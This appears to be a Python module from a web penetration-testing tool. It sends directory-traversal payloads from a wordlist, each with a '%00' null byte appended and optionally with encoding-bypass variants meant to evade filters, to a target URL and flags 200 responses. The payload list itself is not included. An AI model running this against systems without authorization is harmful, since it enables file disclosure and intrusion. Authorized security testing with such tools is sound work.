from .Detection import Detection
from .utils import attack, colors, cook
from .Encoding import EncodingBypass


class NullByte:
    def __init__(self, args):
        self.target = args.url
        self.cookies = args.cookies
        self.detection = args.detection
        self.use_encoding = getattr(args, "encoding", False)

    def attack(self, payload):
        payload = f"{payload}%00"
        if self.cookies:
            cookies = cook(self.cookies)
            response = attack(
                self.target, payload, cookies=cookies, detection_mode=self.detection
            )
        else:
            response = attack(self.target, payload, detection_mode=self.detection)
        return response

    def execute_null_byte(self):
        if self.detection:
            detector = Detection(self)
            detector.detect()
            return

        print(colors("[~] Testing for Null Byte Poisoning", 93))

        if self.use_encoding:
            print(colors("[~] Advanced encoding bypasses enabled", 94))

        with open("payload_wordlists/directory_traversal_list.txt", "r") as payloadfile:
            payloads = payloadfile.readlines()

            for payload in payloads:
                payload = payload.strip()
                test_payloads = [payload]

                if self.use_encoding:
                    # Generate encoding variants
                    variants = EncodingBypass.generate_all_variants(payload)
                    test_payloads.extend(
                        variants[:10]
                    )  # Limit to first 10 variants to avoid spam

                for test_payload in test_payloads:
                    try:
                        response = self.attack(test_payload)
                        if response and response.status_code == 200:
                            print(
                                colors(
                                    f"[+] Null byte response received for: {test_payload}",
                                    92,
                                )
                            )
                    except Exception as e:
                        continue
